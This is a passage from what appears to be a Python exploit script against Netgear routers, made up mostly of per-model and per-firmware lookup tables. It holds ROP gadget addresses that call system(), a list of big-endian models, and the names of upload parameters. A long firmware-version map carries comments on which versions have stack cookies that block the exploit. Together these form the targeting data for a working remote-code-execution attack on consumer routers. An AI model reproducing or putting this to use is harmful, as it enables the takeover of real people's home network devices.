	},
	"XR300" : {
		# 0) gadget: calls system($sp)
		"1.0.3.38" : 0x33258,
		"1.0.3.34" : 0x33258,
		"1.0.3.26" : 0x329b0,
		"1.0.2.24" : 0x329a4,
		"1.0.2.18" : 0x32a84,
		"1.0.1.4"  : 0x325dc,
	},
}

# Devices that are big endian
big_endian_devices = ["D6220", "D6300", "D6400", "D7000V2", "DGN2200", "DGN2200M", "DGN2200V4", "DGND3700", "MBM621",
	"MBRN3000", "WGT624V4", "WNCE3001"]

# The argument name for the file upload. If not listed, it's mtenFWUpload
# It would be real nice if Netgear could standardize on how they update, so I could
# make the exploit work everywhere without handling a dozen corner cases.
argument_names = {
	"EX3700" : {
		"1.0.0.22" : "update_file",
		"1.0.0.24" : "update_file",
		"1.0.0.26" : "update_file",
		"1.0.0.28" : "update_file",
		"1.0.0.34" : "update_file",
		"1.0.0.44" : "update_file",
		"1.0.0.46" : "update_file",
		"1.0.0.48" : "update_file",
		"1.0.0.50" : "update_file",
		"1.0.0.58" : "update_file",
		"1.0.0.62" : "update_file",
		"1.0.0.64" : "update_file",
		"1.0.0.68" : "update_file",
		"1.0.0.70" : "update_file",
		"1.0.0.72" : "update_file",
		"1.0.0.76" : "update_file",
		"1.0.0.78" : "update_file",
	},
	"EX3800" : {
		"1.0.0.26" : "update_file",
		"1.0.0.28" : "update_file",
		"1.0.0.34" : "update_file",
		"1.0.0.44" : "update_file",
		"1.0.0.46" : "update_file",
		"1.0.0.48" : "update_file",
		"1.0.0.50" : "update_file",
		"1.0.0.58" : "update_file",
		"1.0.0.62" : "update_file",
		"1.0.0.64" : "update_file",
		"1.0.0.68" : "update_file",
		"1.0.0.70" : "update_file",
		"1.0.0.72" : "update_file",
		"1.0.0.76" : "update_file",
		"1.0.0.78" : "update_file",
	},
	"EX3920" : {
		"1.0.0.26" : "update_file",
		"1.0.0.28" : "update_file",
		"1.0.0.34" : "update_file",
		"1.0.0.44" : "update_file",
		"1.0.0.46" : "update_file",
		"1.0.0.48" : "update_file",
		"1.0.0.50" : "update_file",
		"1.0.0.58" : "update_file",
		"1.0.0.62" : "update_file",
		"1.0.0.64" : "update_file",
		"1.0.0.68" : "update_file",
		"1.0.0.70" : "update_file",
		"1.0.0.72" : "update_file",
		"1.0.0.76" : "update_file",
		"1.0.0.78" : "update_file",
	},
	"EX6000" : {
		"1.0.0.10" : "update_file",
		"1.0.0.20" : "update_file",
		"1.0.0.24" : "update_file",
		"1.0.0.28" : "update_file",
		"1.0.0.30" : "update_file",
		"1.0.0.32" : "update_file",
		"1.0.0.38" : "update_file",
	},
	"EX6100" : {
		"1.0.2.6"  : "update_file",
		"1.0.1.36" : "update_file",
		"1.0.2.16" : "update_file",
		"1.0.2.18" : "update_file",
		"1.0.2.24" : "update_file",
	},
	"EX6120" : {
		"1.0.0.4"  : "update_file",
		"1.0.0.8"  : "update_file",
		"1.0.0.14" : "update_file",
		"1.0.0.16" : "update_file",
		"1.0.0.26" : "update_file",
		"1.0.0.28" : "update_file",
		"1.0.0.30" : "update_file",
		"1.0.0.32" : "update_file",
		"1.0.0.36" : "update_file",
		"1.0.0.40" : "update_file",
		"1.0.0.42" : "update_file",
		"1.0.0.46" : "update_file",
		"1.0.0.48" : "update_file",
	},
	"EX6130" : {
		"1.0.0.12" : "update_file",
		"1.0.0.16" : "update_file",
		"1.0.0.20" : "update_file",
		"1.0.0.22" : "update_file",
		"1.0.0.24" : "update_file",
		"1.0.0.28" : "update_file",
		"1.0.0.30" : "update_file",
	},
	"EX6150" : {
		"1.0.0.14" : "updateFile",
		"1.0.0.16" : "update_file",
		"1.0.0.28" : "update_file",
		"1.0.0.32" : "update_file",
		"1.0.0.34" : "update_file",
		"1.0.0.42" : "update_file",
	},
	"EX6200" : {
		"1.0.3.68" : "update_file",
		"1.0.3.74" : "update_file",
		"1.0.3.76" : "update_file",
		"1.0.3.82" : "update_file",
		"1.0.3.88" : "update_file",
		"1.0.3.90" : "update_file",
	},
	"EX6920" : {
		"1.0.0.4"  : "update_file",
		"1.0.0.8"  : "update_file",
		"1.0.0.14" : "update_file",
		"1.0.0.16" : "update_file",
		"1.0.0.26" : "update_file",
		"1.0.0.28" : "update_file",
		"1.0.0.30" : "update_file",
		"1.0.0.32" : "update_file",
		"1.0.0.36" : "update_file",
		"1.0.0.40" : "update_file",
	},
	"EX7000" : {
		"1.0.0.30" : "updateFile",
		"1.0.0.32" : "updateFile",
		"1.0.0.36" : "update_file",
		"1.0.0.38" : "update_file",
		"1.0.0.42" : "update_file",
		"1.0.0.50" : "update_file",
		"1.0.0.56" : "update_file",
		"1.0.0.58" : "update_file",
		"1.0.0.62" : "update_file",
		"1.0.0.66" : "update_file",
		"1.0.1.78" : "update_file",
		"1.0.1.80" : "update_file",
		"1.0.1.84" : "update_file",
	},
	"WN2500RPV2" : {
		"1.0.1.42" : "update_file",
		"1.0.1.46" : "update_file",
		"1.0.1.50" : "update_file",
		"1.0.1.54" : "update_file",
	},
}

# A mapping of human friendly versions to the versions returned by currentsetting.htm
firmware_version_to_human_version = {
	"AC1450" : {
		"V1.0.0.36_10.0.17" : "1.0.0.36",
		"V1.0.0.34_10.0.16" : "1.0.0.34",
		"V1.0.0.22_1.0.10"  : "1.0.0.22",
		"V1.0.0.14_1.0.6"   : "1.0.0.14",
		"V1.0.0.8_1.0.4"    : "1.0.0.8",
		"V1.0.0.6_1.0.3"    : "1.0.0.6",
	},
	"D6220" : {
		"V1.0.0.52_1.0.52" : "1.0.0.52",
		"V1.0.0.48_1.0.48" : "1.0.0.48",
		"V1.0.0.46_1.0.46" : "1.0.0.46",
		"V1.0.0.44_1.0.44" : "1.0.0.44",
		"V1.0.0.40_1.0.40" : "1.0.0.40",
		"V1.0.0.36_1.0.36" : "1.0.0.36",
		"V1.0.0.34_1.0.34" : "1.0.0.34",
		"V1.0.0.32_1.0.32" : "1.0.0.32",
		"V1.0.0.28_1.0.28" : "1.0.0.28",
		"V1.0.0.24_1.0.24" : "1.0.0.24",
		"V1.0.0.22_1.0.22" : "1.0.0.22",
		"V1.0.0.16_1.0.16" : "1.0.0.16",
	},
	"D6300" : {
		"V1.0.0.102_1.0.102" : "1.0.0.102",
		"V1.0.0.96_1.1.96"   : "1.0.0.96",
		"V1.0.0.90_1.0.90"   : "1.0.0.90",
		"V1.0.0.88-1.0.88"   : "1.0.0.88",
		"V1.0.0.76_1.0.76"   : "1.0.0.76",
		"V1.0.0.72_1.0.72"   : "1.0.0.72",
		"V1.0.0.42_1.0.42"   : "1.0.0.42",
		"V1.0.0.30_1.0.30"   : "1.0.0.30",
		"V1.0.0.24_1.0.24"   : "1.0.0.24",
		"V1.0.0.16_1.0.16"   : "1.0.0.16",
	},
	"D6400" : {
		"V1.0.0.88_1.0.88" : "1.0.0.88",
		"V1.0.0.86_1.0.86" : "1.0.0.86",
		"V1.0.0.82_1.0.82" : "1.0.0.82",
		"V1.0.0.80_1.0.80" : "1.0.0.80",
		"V1.0.0.78_1.0.78" : "1.0.0.78",
		"V1.0.0.74_1.0.74" : "1.0.0.74",
		"V1.0.0.70_1.0.70" : "1.0.0.70",
		"V1.0.0.68_1.0.68" : "1.0.0.68",
		"V1.0.0.66_1.0.66" : "1.0.0.66",
		"V1.0.0.60_1.0.60" : "1.0.0.60",
		"V1.0.0.58_1.0.58" : "1.0.0.58",
		"V1.0.0.56_1.0.56" : "1.0.0.56",
		"V1.0.0.54_1.0.54" : "1.0.0.54",
		"V1.0.0.52_1.0.52" : "1.0.0.52",
		"V1.0.0.44_1.0.44" : "1.0.0.44",
		"V1.0.0.38_1.1.38" : "1.0.0.38",
		"V1.0.0.34_1.3.34" : "1.0.0.34",
		"V1.0.0.22_1.0.22" : "1.0.0.22",
	},
	"D7000V2" : {
		"V1.0.0.56_1.0.1" : "1.0.0.56",
		"V1.0.0.53_1.0.2" : "1.0.0.53",
		"V1.0.0.52_1.0.1" : "1.0.0.52",
		"V1.0.0.51_1.0.1" : "1.0.0.51",
		"V1.0.0.47_1.0.1" : "1.0.0.47",
		"V1.0.0.45_1.0.1" : "1.0.0.45",
		"V1.0.0.44_1.0.1" : "1.0.0.44",
		"V1.0.0.40_1.0.1" : "1.0.0.40",
		"V1.0.0.38_1.0.1" : "1.0.0.38",
	},
	"D8500" : {
		# Version 1.0.3.29 has stack cookies which will block the
		# exploit. However, Netgear stopped using stack cookies
		# after this version.
		"V1.0.3.44_1.0.1" : "1.0.3.44",
		"V1.0.3.43_1.0.1" : "1.0.3.43",
		"V1.0.3.42_1.0.1" : "1.0.3.42",
		"V1.0.3.39_1.0.1" : "1.0.3.39",
		"V1.0.3.36_1.0.1" : "1.0.3.36",
		"V1.0.3.35_1.0.1" : "1.0.3.35",
		"V1.0.3.28_1.0.1" : "1.0.3.28",
		"V1.0.3.27_1.0.1" : "1.0.3.27",
		"V1.0.3.25_1.0.1" : "1.0.3.25",
	},
	"DC112A" : {
		"V1.0.0.44_1.0.60" : "1.0.0.44",
		"V1.0.0.30_1.0.60" : "1.0.0.30",
		"V1.0.0.24_1.0.60" : "1.0.0.24",
	},
	"DGN2200" : {
		"V1.0.0.58_7.0.57"   : "1.0.0.58",
		"V1.0.0.57_7.0.57"   : "1.0.0.57",
		"V1.0.0.55_7.0.55"   : "1.0.0.55",
		"V1.0.0.52_7.0.52"   : "1.0.0.52",
		"V1.0.0.50_7.0.50NA" : "1.0.0.50NA",
		"V1.0.0.36_7.0.36NA" : "1.0.0.36NA",
		"V1.0.0.36_7.0.36"   : "1.0.0.36",
	},
	"DGN2200M" : {
		"V1.0.0.37_1.0.21WW" : "1.0.0.37",
		"V1.0.0.35_1.0.21WW" : "1.0.0.35",
		"V1.0.0.35_1.0.21NA" : "1.0.0.35NA",
		"V1.0.0.33_1.0.21WW" : "1.0.0.33",
		"V1.0.0.33_1.0.21NA" : "1.0.0.33NA",
		"V1.0.0.26_1.0.20WW" : "1.0.0.26",
		"V1.0.0.24_1.0.20NA" : "1.0.0.24NA",
	},
	"DGN2200V4" : {
		"V1.0.0.110_1.0.110" : "1.0.0.110",
		"V1.0.0.108_1.0.108" : "1.0.0.108",
		"V1.0.0.102_1.0.102" : "1.0.0.102",
		"V1.0.0.98_1.0.98"   : "1.0.0.98",
		"V1.0.0.90_1.0.90"   : "1.0.0.90",
		"V1.0.0.86_1.0.86"   : "1.0.0.86",
		"V1.0.0.82_1.0.82"   : "1.0.0.82",
		"V1.0.0.76_1.0.76"   : "1.0.0.76",
		"V1.0.0.66_1.0.66"   : "1.0.0.66",
		"V1.0.0.62_1.0.62"   : "1.0.0.62",
		"V1.0.0.58_1.0.58"   : "1.0.0.58",
		"V1.0.0.46_1.0.46"   : "1.0.0.46",
		"V1.0.0.24_5.0.8"    : "1.0.0.24",
		"V1.0.0.5_5.0.3"     : "1.0.0.5",
	},
	"DGND3700" : {
		"V1.0.0.17_1.0.17"   : "1.0.0.17",
		"V1.0.0.17_1.0.17NA" : "1.0.0.17NA",
		"V1.0.0.12_1.0.12"   : "1.0.0.12",
		"V1.0.0.12_1.0.12NA" : "1.0.0.12NA",
	},
	"EX3700" : {
		"V1.0.0.78_1.0.51" : "1.0.0.78",
		"V1.0.0.76_1.0.49" : "1.0.0.76",
		"V1.0.0.72_1.0.47" : "1.0.0.72",
		"V1.0.0.70_1.0.46" : "1.0.0.70",
		"V1.0.0.68_1.0.45" : "1.0.0.68",
		"V1.0.0.64_1.0.43" : "1.0.0.64",
		"V1.0.0.62_1.0.42" : "1.0.0.62",
		"V1.0.0.58_1.0.38" : "1.0.0.58",
		"V1.0.0.50_1.0.30" : "1.0.0.50",
		"V1.0.0.48_1.0.28" : "1.0.0.48",
		"V1.0.0.46_1.0.26" : "1.0.0.46",
		"V1.0.0.44_1.0.22" : "1.0.0.44",
		"V1.0.0.34_1.0.22" : "1.0.0.34",
		"V1.0.0.28_1.0.20" : "1.0.0.28",
		"V1.0.0.26_1.0.19" : "1.0.0.26",
		"V1.0.0.24_1.0.18" : "1.0.0.24",
		"V1.0.0.22_1.0.17" : "1.0.0.22",
	},
	"EX3800" : {
		"V1.0.0.78_1.0.51" : "1.0.0.78",
		"V1.0.0.76_1.0.49" : "1.0.0.76",
		"V1.0.0.72_1.0.47" : "1.0.0.72",
		"V1.0.0.70_1.0.46" : "1.0.0.70",
		"V1.0.0.68_1.0.45" : "1.0.0.68",
		"V1.0.0.64_1.0.43" : "1.0.0.64",
		"V1.0.0.62_1.0.42" : "1.0.0.62",
		"V1.0.0.58_1.0.38" : "1.0.0.58",
		"V1.0.0.50_1.0.30" : "1.0.0.50",
		"V1.0.0.48_1.0.28" : "1.0.0.48",
		"V1.0.0.46_1.0.26" : "1.0.0.46",
		"V1.0.0.44_1.0.22" : "1.0.0.44",
		"V1.0.0.34_1.0.22" : "1.0.0.34",
		"V1.0.0.28_1.0.20" : "1.0.0.28",
		"V1.0.0.26_1.0.19" : "1.0.0.26",
	},
	"EX3920" : {
		"V1.0.0.78_1.0.51" : "1.0.0.78",
		"V1.0.0.76_1.0.49" : "1.0.0.76",
		"V1.0.0.72_1.0.47" : "1.0.0.72",
		"V1.0.0.70_1.0.46" : "1.0.0.70",
		"V1.0.0.68_1.0.45" : "1.0.0.68",
		"V1.0.0.64_1.0.43" : "1.0.0.64",
		"V1.0.0.62_1.0.42" : "1.0.0.62",
		"V1.0.0.58_1.0.38" : "1.0.0.58",
		"V1.0.0.50_1.0.30" : "1.0.0.50",
		"V1.0.0.48_1.0.28" : "1.0.0.48",
		"V1.0.0.46_1.0.26" : "1.0.0.46",
		"V1.0.0.44_1.0.22" : "1.0.0.44",
		"V1.0.0.34_1.0.22" : "1.0.0.34",
		"V1.0.0.28_1.0.20" : "1.0.0.28",
		"V1.0.0.26_1.0.19" : "1.0.0.26",
	},
	"EX6000" : {
		"V1.0.0.38_1.0.22" : "1.0.0.38",
		"V1.0.0.32_1.0.18" : "1.0.0.32",
		"V1.0.0.30_1.0.17" : "1.0.0.30",
		"V1.0.0.28_1.0.16" : "1.0.0.28",
		"V1.0.0.24_1.0.14" : "1.0.0.24",
		"V1.0.0.20_1.0.11" : "1.0.0.20",
		"V1.0.0.10_1.0.6"  : "1.0.0.10",
	},
	"EX6100" : {
		"V1.0.2.24_1.1.134" : "1.0.2.24",
		"V1.0.2.18_1.1.131" : "1.0.2.18",
		"V1.0.2.16_1.1.130" : "1.0.2.16",
		"V1.0.2.6_1.1.120"  : "1.0.2.6",
		"V1.0.1.36_1.0.114" : "1.0.1.36",
		"V1.0.0.28_1.0.66"  : "1.0.0.28",
		"V1.0.0.22_1.0.51"  : "1.0.0.22",
	},
	"EX6120" : {
		"V1.0.0.48_1.0.30" : "1.0.0.48",
		"V1.0.0.46_1.0.29" : "1.0.0.46",
		"V1.0.0.42_1.0.27" : "1.0.0.42",
		"V1.0.0.40_1.0.25" : "1.0.0.40",
		"V1.0.0.36_1.0.23" : "1.0.0.36",
		"V1.0.0.32_1.0.21" : "1.0.0.32",
		"V1.0.0.30_1.0.20" : "1.0.0.30",
		"V1.0.0.28_1.0.18" : "1.0.0.28",
		"V1.0.0.26_1.0.16" : "1.0.0.26",
		"V1.0.0.16_1.0.11" : "1.0.0.16",
		"V1.0.0.14_1.0.10" : "1.0.0.14",
		"V1.0.0.8_1.0.4"   : "1.0.0.8",
		"V1.0.0.4_1.0.2"   : "1.0.0.4",
	},
	"EX6130" : {
		"V1.0.0.30_1.0.17" : "1.0.0.30",
		"V1.0.0.28_1.0.16" : "1.0.0.28",
		"V1.0.0.24_1.0.14" : "1.0.0.24",
		"V1.0.0.22_1.0.13" : "1.0.0.22",
		"V1.0.0.20_1.0.12" : "1.0.0.20",
		"V1.0.0.16_1.0.10" : "1.0.0.16",
		"V1.0.0.12_1.0.7"  : "1.0.0.12",
	},
	"EX6150" : {
		"V1.0.0.42_1.0.73" : "1.0.0.42",
		"V1.0.0.34_1.0.69" : "1.0.0.34",
		"V1.0.0.32_1.0.68" : "1.0.0.32",
		"V1.0.0.28_1.0.64" : "1.0.0.28",
		"V1.0.0.16_1.0.58" : "1.0.0.16",
		"V1.0.0.14_1.0.54" : "1.0.0.14",
	},
	"EX6200" : {
		"V1.0.3.90_1.1.125" : "1.0.3.90",
		"V1.0.3.88_1.1.123" : "1.0.3.88",
		"V1.0.3.82_1.1.117" : "1.0.3.82",
		"V1.0.3.76_1.1.111" : "1.0.3.76",
		"V1.0.3.74_1.1.109" : "1.0.3.74",
		"V1.0.3.68_1.1.104" : "1.0.3.68",
		"V1.0.1.60_1.1.98"  : "1.0.1.60",
		"V1.0.0.52_1.1.90"  : "1.0.0.52",
		"V1.0.0.46_1.1.70"  : "1.0.0.46",
		"V1.0.0.42_1.1.57"  : "1.0.0.42",
		"V1.0.0.38_1.1.52"  : "1.0.0.38",
	},
	"EX6920" : {
		"V1.0.0.40_1.0.25" : "1.0.0.40",
		"V1.0.0.36_1.0.23" : "1.0.0.36",
		"V1.0.0.32_1.0.21" : "1.0.0.32",
		"V1.0.0.30_1.0.20" : "1.0.0.30",
		"V1.0.0.28_1.0.18" : "1.0.0.28",
		"V1.0.0.26_1.0.16" : "1.0.0.26",
		"V1.0.0.16_1.0.11" : "1.0.0.16",
		"V1.0.0.14_1.0.10" : "1.0.0.14",
		"V1.0.0.8_1.0.4"   : "1.0.0.8",
		"V1.0.0.4_1.0.2"   : "1.0.0.4",
	},
	"EX7000" : {
		"V1.0.1.84_1.0.148" : "1.0.1.84",
		"V1.0.1.80_1.0.144" : "1.0.1.80",
		"V1.0.1.78_1.0.140" : "1.0.1.78",
		"V1.0.0.66_1.0.126" : "1.0.0.66",
		"V1.0.0.62_1.0.122" : "1.0.0.62",
		"V1.0.0.58_1.0.112" : "1.0.0.58",
		"V1.0.0.56_1.0.108" : "1.0.0.56",
		"V1.0.0.50_1.0.102" : "1.0.0.50",
		"V1.0.0.42_1.0.94"  : "1.0.0.42",
		"V1.0.0.38_1.0.91"  : "1.0.0.38",
		"V1.0.0.36_1.0.88"  : "1.0.0.36",
		"V1.0.0.32_1.0.84"  : "1.0.0.32",
		"V1.0.0.30_1.0.72"  : "1.0.0.30",
	},
	"LG2200D" : {
		"V1.0.0.57_1.0.40" : "1.0.0.57",
	},
	"MBM621" : {
		"V1.1.3" : "1.1.3",
	},
	"MBR624GU" : {
		"V6.01.30.64WW" : "6.1.30.64",
		"V6.01.30.61WW" : "6.1.30.61",
		"V6.01.30.59WW" : "6.1.30.59",
		"V6.01.30.59NA" : "6.1.30.59NA",
		"V6.00.30.46WW" : "6.0.30.46",
		"V6.00.28.43WW" : "6.0.28.43",
		"V6.00.28.43NA" : "6.0.28.43NA",
		"V6.00.26.21WW" : "6.0.26.21",
		"V6.00.22.14NA" : "6.0.22.14NA",
		"V6.00.22.12"   : "6.0.22.12",
	},
	"MBR1200" : {
		"V1.2.2.53" : "1.2.2.53",
	},
	"MBR1515" : {
		"V1.2.2.68" : "1.2.2.68",
	},
	"MBR1516" : {
		"V1.2.2.84BM" : "1.2.2.84BM",
	},
	"MBRN3000" : {
		"V1.0.0.74_2.0.12WW" : "1.0.0.74",
		"V1.0.0.72_2.0.12WW" : "1.0.0.72",
		"V1.0.0.72_2.0.12NA" : "1.0.0.72NA",
		"V1.0.0.69_2.0.12WW" : "1.0.0.69",
		"V1.0.0.69_2.0.12NA" : "1.0.0.69NA",
		"V1.0.0.65_2.0.12WW" : "1.0.0.65",
		"V1.0.0.65_2.0.12NA" : "1.0.0.65NA",
		"V1.0.0.43NA"        : "1.0.0.43NA",
	},
	"MVBR1210C" : {
		"V1.2.0.35BM" : "1.2.0.35",
	},
	"R4500" : {
		"V1.0.0.4_1.0.3" : "1.0.0.4",
	},
	"R6200" : {
		"V1.0.1.58_1.0.44" : "1.0.1.58",
		"V1.0.1.56_1.0.43" : "1.0.1.56",
		"V1.0.1.52_1.0.41" : "1.0.1.52",
		"V1.0.1.48_1.0.37" : "1.0.1.48",
		"V1.0.1.46_1.0.36" : "1.0.1.46",
		"V1.0.0.28_1.0.24" : "1.0.0.28",
		"V1.0.0.18_1.0.18" : "1.0.0.18",
	},
	"R6200V2" : {
		"V1.0.3.12_10.1.11" : "1.0.3.12",
		"V1.0.3.10_10.1.10" : "1.0.3.10",
		"V1.0.1.20_1.0.18"  : "1.0.1.20",
		"V1.0.1.18_1.0.17"  : "1.0.1.18",
		"V1.0.1.16_1.0.15"  : "1.0.1.16",
		"V1.0.1.14_1.0.14"  : "1.0.1.14",
	},
	"R6250" : {
		"V1.0.4.38_10.1.30" : "1.0.4.38",
		"V1.0.4.36_10.1.30" : "1.0.4.36",
		"V1.0.4.34_10.1.28" : "1.0.4.34",
		"V1.0.4.26_10.1.23" : "1.0.4.26",
		"V1.0.4.20_10.1.20" : "1.0.4.20",
		"V1.0.4.16_10.1.18" : "1.0.4.16",
		"V1.0.4.14_10.1.17" : "1.0.4.14",
		"V1.0.4.12_10.1.15" : "1.0.4.12",
		"V1.0.4.8_10.1.13"  : "1.0.4.08",
		"V1.0.4.6_10.1.12"  : "1.0.4.06",
		"V1.0.4.2_10.1.10"  : "1.0.4.02",
		"V1.0.3.12_10.1.8"  : "1.0.3.12",
		"V1.0.3.6_10.1.3"   : "1.0.3.06",
		"V1.0.1.84_1.0.78"  : "1.0.1.84",
		"V1.0.1.82_1.0.77"  : "1.0.1.82",
		"V1.0.1.80_1.0.75"  : "1.0.1.80",
		"V1.0.0.72_1.0.71"  : "1.0.0.72",
		"V1.0.0.70_1.0.70"  : "1.0.0.70",
		"V1.0.0.62_1.0.62"  : "1.0.0.62",
	},
	"R6300" : {
		"V1.0.2.80_1.0.59" : "1.0.2.80",
		"V1.0.2.78_1.0.58" : "1.0.2.78",
		"V1.0.2.76_1.0.57" : "1.0.2.76",
		"V1.0.2.70_1.0.50" : "1.0.2.70",
		"V1.0.2.68_1.0.49" : "1.0.2.68",
		"V1.0.2.38_1.0.33" : "1.0.2.38",
		"V1.0.2.36_1.0.28" : "1.0.2.36",
		"V1.0.2.26_1.0.26" : "1.0.2.26",
		"V1.0.2.14_1.0.23" : "1.0.2.14",
		"V1.0.2.10_1.0.21" : "1.0.2.10",
		"V1.0.0.90_1.0.18" : "1.0.0.90",
		"V1.0.0.68_1.0.16" : "1.0.0.68",
	},
	"R6300V2" : {
		# Versions 1.0.4.12, 1.0.4.18, and 1.0.4.20 all have stack
		# cookies which will block the exploit. However, Netgear
		# stopped using stack cookies again in version 1.0.4.24
		"V1.0.4.36_10.0.93" : "1.0.4.36",
		"V1.0.4.34_10.0.92" : "1.0.4.34",
		"V1.0.4.32_10.0.91" : "1.0.4.32",
		"V1.0.4.28_10.0.89" : "1.0.4.28",
		"V1.0.4.24_10.0.87" : "1.0.4.24",
		"V1.0.4.8_10.0.77"  : "1.0.4.8",
		"V1.0.4.6_10.0.76"  : "1.0.4.6",
		"V1.0.4.2_10.0.74"  : "1.0.4.2",
		"V1.0.3.30_10.0.73" : "1.0.3.30",
		"V1.0.3.28_10.0.71" : "1.0.3.28",
		"V1.0.3.26_10.0.70" : "1.0.3.26",
		"V1.0.3.22_10.0.67" : "1.0.3.22",
		"V1.0.3.8_1.0.60"   : "1.0.3.8",
		"V1.0.3.6_1.0.63CH" : "1.0.3.6CH",
		"V1.0.3.2_1.0.57"   : "1.0.3.2",
		"V1.0.2.86_1.0.51"  : "1.0.2.86",
		"V1.0.2.72_1.0.46"  : "1.0.2.72",
		"V1.0.1.72_1.0.21"  : "1.0.1.72",
	},
	"R6400" : {
		"V1.0.1.52_1.0.36"  : "1.0.1.52",
		"V1.0.1.50_1.0.35"  : "1.0.1.50",
		"V1.0.1.46_1.0.32"  : "1.0.1.46",
		"V1.0.1.44_1.0.31"  : "1.0.1.44",
		"V1.0.1.42_1.0.28"  : "1.0.1.42",
		"V1.0.1.36_1.0.25"  : "1.0.1.36",
		"V1.0.1.34_1.0.24"  : "1.0.1.34",
		"V1.0.1.26_1.0.19"  : "1.0.1.26",
		"V1.0.1.24_1.0.18"  : "1.0.1.24",
		"V1.0.1.22_1.0.17"  : "1.0.1.22",
		"V1.0.1.20_1.0.16"  : "1.0.1.20",
		"V1.0.1.18_1.0.15"  : "1.0.1.18",
		"V1.0.1.12_1.0.11"  : "1.0.1.12",
		"V1.0.1.6_1.0.4"    : "1.0.1.6",
		"V1.0.0.26_1.0.14"  : "1.0.0.26",
		"V1.0.0.24_1.0.13"  : "1.0.0.24",
		"V1.0.0.20_1.0.11"  : "1.0.0.20",
		"V1.0.0.14_1.0.8"   : "1.0.0.14",
	},
	"R6400V2" : {
		"V1.0.4.84_10.0.58" : "1.0.4.84",
		"V1.0.4.82_10.0.57" : "1.0.4.82",
		"V1.0.4.78_10.0.55" : "1.0.4.78",
		"V1.0.3.66_10.0.50" : "1.0.3.66",
		"V1.0.2.66_10.0.48" : "1.0.2.66",
		"V1.0.2.62_10.0.46" : "1.0.2.62",
		"V1.0.2.60_10.0.44" : "1.0.2.60",
		"V1.0.2.56_10.0.42" : "1.0.2.56",
		"V1.0.2.52_1.0.39"  : "1.0.2.52",
		"V1.0.2.50_1.0.38"  : "1.0.2.50",
		"V1.0.2.46_1.0.36"  : "1.0.2.46",
		"V1.0.2.44_1.0.35"  : "1.0.2.44",
		"V1.0.2.34_1.0.22"  : "1.0.2.34",
		"V1.0.2.32_1.0.20"  : "1.0.2.32",
		"V1.0.2.14_1.0.7"   : "1.0.2.14",
	},
	"R6700" : {
		"V1.0.2.8_10.0.53"  : "1.0.2.8",
		"V1.0.2.6_10.0.52"  : "1.0.2.6",
		"V1.0.1.48_10.0.46" : "1.0.1.48",
		"V1.0.1.46_10.0.45" : "1.0.1.46",
		"V1.0.1.44_10.0.44" : "1.0.1.44",
		"V1.0.1.36_10.0.40" : "1.0.1.36",
		"V1.0.1.32_10.0.38" : "1.0.1.32",
		"V1.0.1.26_10.0.35" : "1.0.1.26",
		"V1.0.1.22_10.0.33" : "1.0.1.22",
		"V1.0.1.20_10.0.32" : "1.0.1.20",
		"V1.0.1.16_10.0.30" : "1.0.1.16",
		"V1.0.1.14_10.0.29" : "1.0.1.14",
		"V1.0.0.26_10.0.26" : "1.0.0.26",
		"V1.0.0.24_10.0.18" : "1.0.0.24",
		"V1.0.0.2_1.0.1"    : "1.0.0.2",
	},
	"R6700V3" : {
		"V1.0.4.84_10.0.58" : "1.0.4.84",
		"V1.0.4.82_10.0.57" : "1.0.4.82",
		"V1.0.4.78_10.0.55" : "1.0.4.78",
		"V1.0.3.66_10.0.50" : "1.0.3.66",
		"V1.0.2.66_10.0.48" : "1.0.2.66",
		"V1.0.2.62_10.0.46" : "1.0.2.62",
		"V1.0.2.60_10.0.44" : "1.0.2.60",
		"V1.0.2.56_10.0.42" : "1.0.2.56",
		"V1.0.2.52_1.0.39"  : "1.0.2.52",
	},
	"R6900" : {
		"V1.0.2.8_10.0.38"  : "1.0.2.8",
		"V1.0.2.6_10.0.37"  : "1.0.2.6",
		"V1.0.2.4_10.0.35"  : "1.0.2.4",
		"V1.0.1.48_10.0.30" : "1.0.1.48",
		"V1.0.1.46_10.0.29" : "1.0.1.46",
		"V1.0.1.44_10.0.28" : "1.0.1.44",
		"V1.0.1.34_1.0.24"  : "1.0.1.34",
		"V1.0.1.28_1.0.21"  : "1.0.1.28",
		"V1.0.1.26_1.0.20"  : "1.0.1.26",
		"V1.0.1.22_1.0.18"  : "1.0.1.22",
		"V1.0.1.20_1.0.17"  : "1.0.1.20",
		"V1.0.1.16_1.0.15"  : "1.0.1.16",
		"V1.0.1.14_1.0.14"  : "1.0.1.14",
		"V1.0.0.4_1.0.10"   : "1.0.0.4",
		"V1.0.0.2_1.0.2"    : "1.0.0.2",
	},
	"R6900P" : {
		"V1.3.1.64_10.1.36" : "1.3.1.64",
		"V1.3.1.44_10.1.23" : "1.3.1.44",
		"V1.3.1.26_10.1.3"  : "1.3.1.26",
		"V1.3.0.20_10.1.1"  : "1.3.0.20",
		"V1.3.0.8_1.0.93"   : "1.3.0.8",
		"V1.2.0.22_1.0.78"  : "1.2.0.22",
		"V1.0.1.14_1.0.59"  : "1.0.1.14",
		"V1.0.0.58_1.0.50"  : "1.0.0.58",
		"V1.0.0.46_1.0.30"  : "1.0.0.46",
	},
	"R7000" : {
		"V1.0.0.96_1.0.15"     : "0.96",
		"V1.0.1.22_1.0.15"     : "1.22",
		"V1.0.2.164_1.0.15"    : "2.16",
		"V1.0.2.194_1.0.15"    : "2.19",
		"V1.0.3.24_1.1.20"     : "3.24",
		"V1.0.3.56_1.1.25"     : "3.56",
		"V1.0.3.60_1.1.27"     : "3.60",
		"V1.0.3.68_1.1.31"     : "3.68",
		"V1.0.3.80_1.1.38"     : "3.80",
		"V1.0.4.18_1.1.52"     : "4.18",
		"V1.0.4.28_1.1.64"     : "4.28",
		"V1.0.4.30_1.1.67"     : "4.30",
		"V1.0.5.64_1.1.88"     : "5.64",
		"V1.0.5.70_1.1.91"     : "5.70",
		"V1.0.7.2_1.1.93"      : "7.2",
		"V1.0.7.6_1.1.99"      : "7.6",
		"V1.0.7.10_1.2.3"      : "7.10",
		"V1.0.7.12_1.2.5"      : "7.12",
		"V1.0.8.34_1.2.15"     : "8.34",
		"V1.0.9.6_1.2.19"      : "9.6",
		"V1.0.9.10_1.2.21"     : "9.10",
		"V1.0.9.12_1.2.23"     : "9.12",
		"V1.0.9.14_1.2.25"     : "9.14",
		"V1.0.9.18_1.2.27"     : "9.18",
		"V1.0.9.26_10.2.31"    : "9.26",
		"V1.0.9.28_10.2.32"    : "9.28",
		"V1.0.9.32_10.2.34"    : "9.32",
		"V1.0.9.34_10.2.36"    : "9.34",
		"V1.0.9.42_10.2.44"    : "9.42",
		"V1.0.9.60_10.2.60"    : "9.60",
